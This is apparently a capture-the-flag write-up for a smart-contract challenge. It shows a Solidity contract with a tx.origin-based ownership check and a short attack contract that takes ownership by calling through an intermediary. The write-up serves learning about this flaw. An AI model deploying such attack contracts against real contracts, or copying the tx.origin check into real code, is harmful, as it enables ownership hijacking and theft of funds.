# Description
Claim ownership of the contract below to complete this level.

  Things that might help

- See the Help page above, section "Beyond the console"

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

# Notes

This was again a straight forward challenge, to claim the ownership of contract, one must call the `changeOwner` function and has the `tx.origin` address different from the `msg.sender`, this is particularly true when calling the this function from another smart contract, in which case the `tx.origin` will be that of the original transaction sender, while the `msg.sender` will refer to the address of the contract from which you called the function.

- A simple attack contract will be something like this :
```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface ITelephoneChallenge {
    function changeOwner(address new_owner) external;
}

contract AttackContract {

    ITelephoneChallenge public challenge;

    constructor() {
        challenge = ITelephoneChallenge(0x9aeAb833B62153e407073Bf092C042D1765d76FC);
    }

    function attack() external payable {
        challenge.changeOwner(tx.origin);
    }

}
```
